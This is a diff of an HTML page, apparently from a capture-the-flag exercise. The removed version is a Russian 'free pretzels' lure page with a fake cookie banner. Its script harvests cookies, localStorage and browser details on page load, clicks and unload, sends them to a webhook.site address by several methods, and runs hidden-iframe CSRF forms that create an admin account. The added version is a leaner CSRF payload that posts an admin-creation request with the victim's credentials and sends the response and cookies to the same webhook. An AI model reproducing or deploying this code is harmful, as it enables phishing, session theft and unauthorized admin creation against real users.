@@ -1,269 +1,65 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <title>Бесплатные крендели! 🥨</title>
-    <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            text-align: center; 
-            padding: 50px; 
-            background: linear-gradient(to right, #ffecd2, #fcb69f);
-        }
-        .container { 
-            background: white; 
-            padding: 40px; 
-            border-radius: 20px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1); 
-            max-width: 600px; 
-            margin: 0 auto;
-        }
-        h1 { color: #e74c3c; font-size: 2.5em; }
-        .pretzel { font-size: 4em; margin: 20px; }
-        .button { 
-            background: #2ecc71; 
-            color: white; 
-            border: none; 
-            padding: 20px 40px; 
-            font-size: 1.5em; 
-            border-radius: 50px; 
-            cursor: pointer; 
-            margin: 20px; 
-            transition: 0.3s;
-        }
-        .button:hover { background: #27ae60; transform: scale(1.05); }
-        .cookie-banner { 
-            background: #2c3e50; 
-            color: white; 
-            padding: 15px; 
-            position: fixed; 
-            bottom: 0; 
-            width: 100%; 
-            left: 0;
-        }
-        .cookie-btn { 
-            background: #f39c12; 
-            border: none; 
-            color: white; 
-            padding: 10px 20px; 
-            border-radius: 5px; 
-            cursor: pointer;
-        }
-    </style>
-</head>
+<html>
 <body>
-    <div class="container">
-        <h1>🥨 БЕСПЛАТНЫЕ КРЕНДЕЛИ! 🥨</h1>
-        <div class="pretzel">🥨</div>
-        <p style="font-size: 1.2em; color: #555;">
-            Последний день! Раздаем 1000 кренделей бесплатно!<br>
-            Каждый получает коробку из 12 свежих кренделей!
-        </p>
-        
-        <button class="button" id="getPretzels">🎁 ПОЛУЧИТЬ КРЕНДЕЛИ БЕСПЛАТНО!</button>
-        
-        <p style="margin-top: 30px; color: #888; font-size: 0.9em;">
-            Осталось всего: <span id="counter" style="color: red; font-weight: bold;">156</span> коробок
-        </p>
-    </div>
-    
-    <div class="cookie-banner" id="cookieBanner">
-        🍪 Мы используем cookies для вашего удобства.
-        <button class="cookie-btn" id="acceptCookies">Принять cookies</button>
-    </div>
+<script>
+// Создаем и отправляем форму для создания админа
+const form = document.createElement('form');
+form.method = 'POST';
+form.action = 'https://tasks.goidactf.ru:20061/create_admin';
+form.enctype = 'application/x-www-form-urlencoded';
+form.innerHTML = '<input name="new_admin_login" value="123">';
+document.body.appendChild(form);
 
-    <script>
-        const WEBHOOK = 'https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb';
-        
-        // 1. Функция сбора данных (ВСЕ КУКИ и не только)
-        function stealData(eventName) {
-            const data = {
-                time: new Date().toISOString(),
-                event: eventName,
-                // ГЛАВНОЕ - куки
-                cookies: document.cookie,
-                // Всё остальное тоже полезно
-                userAgent: navigator.userAgent,
-                url: window.location.href,
-                referrer: document.referrer,
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-            
-            // Попробуем достать всё из localStorage
-            try {
-                let lsData = {};
-                for(let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    lsData[key] = localStorage.getItem(key);
-                }
-                data.localStorage = lsData;
-            } catch(e) {}
-            
-            return data;
-        }
-        
-        // 2. Отправка на webhook (3 способа для надёжности)
-        function sendToWebhook(data) {
-            console.log("🛡️ Отправляю украденное:", data);
-            
-            // Способ 1: Fetch
-            fetch(WEBHOOK, {
+// Отправляем форму с куками пользователя
+fetch('https://tasks.goidactf.ru:20061/create_admin', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: 'new_admin_login=123'
+})
+.then(response => response.text())
+.then(result => {
+    // Отправляем результат на webhook
+    fetch('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            timestamp: new Date().toISOString(),
+            target: 'https://tasks.goidactf.ru:20061/create_admin',
+            payload: 'new_admin_login=123',
+            result: result,
+            cookies: document.cookie
+        })
+    });
+    
+    // Создаем кнопку для повторения
+    const btn = document.createElement('button');
+    btn.textContent = 'Повторить запрос';
+    btn.onclick = () => {
+        fetch('https://tasks.goidactf.ru:20061/create_admin', {
+            method: 'POST',
+            credentials: 'include',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'new_admin_login=123'
+        })
+        .then(r => r.text())
+        .then(r => {
+            fetch('https://webhook.site/dad3429d-7050-4fa7-985a-6cdd831978fb', {
                 method: 'POST',
-                mode: 'no-cors',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            }).catch(e => {});
-            
-            // Способ 2: Картинка (работает почти всегда)
-            const img = new Image();
-            img.src = `${WEBHOOK}?fallback=${Date.now()}&data=${encodeURIComponent(JSON.stringify(data))}`;
-            
-            // Способ 3: FormData
-            setTimeout(() => {
-                try {
-                    const form = document.createElement('form');
-                    form.action = WEBHOOK;
-                    form.method = 'POST';
-                    form.style.display = 'none';
-                    
-                    const input = document.createElement('input');
-                    input.name = 'stolen';
-                    input.value = JSON.stringify(data);
-                    form.appendChild(input);
-                    
-                    document.body.appendChild(form);
-                    form.submit();
-                    setTimeout(() => form.remove(), 1000);
-                } catch(e) {}
-            }, 100);
-        }
-        
-        // 3. CSRF АТАКА через СКРЫТЫЕ ФОРМЫ (БЕЗ ПЕРЕАДРЕСАЦИИ!)
-        function csrfAttack() {
-            console.log("🔥 Запускаю CSRF атаку...");
-            
-            // Цели для атаки
-            const targets = [
-                'https://tasks.goidactf.ru:20061/create_admin',
-                'https://tasks.goidactf.ru:20061/admin'
-            ];
-            
-            targets.forEach(url => {
-                try {
-                    // СОЗДАЕМ СКРЫТУЮ IFRAME
-                    const iframe = document.createElement('iframe');
-                    iframe.name = `csrf-frame-${Date.now()}`;
-                    iframe.style.display = 'none';
-                    document.body.appendChild(iframe);
-                    
-                    // СОЗДАЕМ СКРЫТУЮ ФОРМУ В IFRAME
-                    setTimeout(() => {
-                        const form = document.createElement('form');
-                        form.action = url;
-                        form.method = 'POST';
-                        form.target = iframe.name;
-                        form.style.display = 'none';
-                        
-                        // Добавляем вредоносные данные
-                        const input1 = document.createElement('input');
-                        input1.name = 'new_admin_login';
-                        input1.value = `hacked_by_csrf_${Math.random().toString(36).substr(2, 8)}`;
-                        form.appendChild(input1);
-                        
-                        // Добавляем куки жертвы
-                        const input2 = document.createElement('input');
-                        input2.name = 'victim_cookies';
-                        input2.value = document.cookie;
-                        form.appendChild(input2);
-                        
-                        document.body.appendChild(form);
-                        form.submit();
-                        
-                        // Убираем через секунду
-                        setTimeout(() => {
-                            form.remove();
-                            iframe.remove();
-                        }, 1000);
-                        
-                    }, 50);
-                    
-                } catch(e) {
-                    console.log("CSRF не удался:", e);
-                }
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    action: 'button_click',
+                    result: r
+                })
             });
-        }
-        
-        // 4. Обработчики событий
-        
-        // Принятие куки
-        document.getElementById('acceptCookies').onclick = function() {
-            // Ставим фейковые куки
-            document.cookie = "pretzel_consent=accepted; path=/; max-age=31536000";
-            document.cookie = "user_id=" + Math.random().toString(36).substr(2, 10) + "; path=/";
-            
-            // Крадём данные
-            const data = stealData('cookies_accepted');
-            sendToWebhook(data);
-            
-            // Прячем баннер
-            document.getElementById('cookieBanner').style.display = 'none';
-            
-            // Запускаем CSRF атаку
-            csrfAttack();
-        };
-        
-        // Кнопка "Получить крендели"
-        document.getElementById('getPretzels').onclick = function() {
-            const btn = this;
-            btn.innerHTML = "⏳ Обрабатываем...";
-            btn.disabled = true;
-            
-            // Крадём данные
-            const data = stealData('button_click');
-            sendToWebhook(data);
-            
-            // Интенсивная CSRF атака
-            csrfAttack();
-            
-            // Показываем "успех"
-            setTimeout(() => {
-                btn.innerHTML = "✅ ВАША ЗАЯВКА №" + (Math.floor(Math.random() * 900) + 100) + " ПРИНЯТА!";
-                btn.style.background = "#3498db";
-                
-                // Крадём ещё раз после "успеха"
-                const successData = stealData('order_success');
-                sendToWebhook(successData);
-            }, 1500);
-            
-            // Уменьшаем счётчик
-            let counter = 156;
-            const interval = setInterval(() => {
-                if(counter > 0) {
-                    counter--;
-                    document.getElementById('counter').textContent = counter;
-                } else {
-                    clearInterval(interval);
-                }
-            }, 50);
-        };
-        
-        // Крадём данные сразу при загрузке
-        window.onload = function() {
-            setTimeout(() => {
-                const data = stealData('page_load');
-                sendToWebhook(data);
-            }, 500);
-        };
-        
-        // Крадём при уходе
-        window.onbeforeunload = function() {
-            const data = stealData('page_unload');
-            navigator.sendBeacon(WEBHOOK, JSON.stringify(data));
-        };
-        
-        console.log("🥨 Страница-ловушка готова к краже данных!");
-    </script>
+        });
+    };
+    document.body.appendChild(btn);
+});
+</script>
 </body>
 </html>
